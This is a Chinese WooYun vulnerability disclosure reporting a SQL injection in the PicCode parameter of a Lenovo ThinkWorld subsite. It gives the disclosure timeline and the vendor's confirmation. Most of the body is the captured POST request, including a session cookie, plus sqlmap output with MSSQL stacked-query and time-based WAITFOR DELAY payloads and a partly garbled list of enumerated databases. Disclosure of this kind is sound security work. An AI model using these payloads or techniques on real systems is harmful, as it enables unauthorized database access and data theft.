wybug_title: 联想某分站存在SQL注射漏洞
wybug_detail:
漏洞详情 披露状态：   									2013-12-31：	细节已通知厂商并且等待厂商处理中									2014-01-03：	厂商已经确认，细节仅向厂商公开									2014-01-13：	细节向核心白帽子及相关领域专家公开									2014-01-23：	细节向普通白帽子公开									2014-02-02：	细节向实习白帽子公开									2014-02-14：	细节向公众公开  简要描述： 联想#某分站存在SQL注射漏洞 详细说明：  站点：http://ss.thinkworld.com.cnPicCode参数没有过滤，导致注射burp抓包数据POST /handler/approvalHandler.ashx?t=approval HTTP/1.1Content-Length: 54Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: ss.thinkworld.com.cnCookie: ASP.NET_SessionId=rlgdtu1up2trvtfpupprwr22; wbm_oauthv2=oauth=sina&app=my_appHost: ss.thinkworld.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*PicCode=998367sqlmap跑下sqlmap identified the following injection points with a total of 100 HTTP(s) requests:---Place: POSTParameter: PicCode    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PicCode=998367'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: PicCode=998367' WAITFOR DELAY '0:0:5'-----sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: PicCode    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PicCode=998367'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: PicCode=998367' WAITFOR DELAY '0:0:5'-----sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: PicCode    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PicCode=998367'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: PicCode=998367' WAITFOR DELAY '0:0:5'-----current user:    'thinkwould\x05\x02'current database:    'ThmnkPad_aanli_DB`4'available databases [25]:[*] \x7fq_pino[*] Gift_Activity_DB\x02[*] gq_musio[*] JYa_1758_DBE\x02!\x11[*] JYT_Activity_Fanli[*] JYT_LiChvn_DB[*] JYT_MiniSale_DB\x0f\x11\x03[*] JYT_UW_MiniSale_DB[*] JYT_UWine_DB[*] Mall_Spider_DB[*] master[*] MiniSale_Confih_DB[*] model[*] msdb\x03[*] sq_iscs[*] sq_izcILD\x057A[*] sq_nSD[*] sq_xqog\x02\x05\x07\x02%a\x07M7\x11[*] tempds\x11[*] ThinkPad_Fanli_DB_4\x02[*] ThinkPcd_Fanlj_DB_33J'\x13AAAA[*] ThknkPjd_Act_20131212[*] UhiwkSas_Fanln_DB[*] zhinkPad_Fanli_DB_4[*] ~у_wine基于时间的注入，太慢不深入。

over   漏洞证明：  已经证明   修复方案：  过滤参数   版权声明：转载请注明来源 Mr.leo@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-01-03 10:40 厂商回复： 感谢您对联想安全做出的贡献！我们将立即评估与修复相关漏洞 最新状态： 暂无
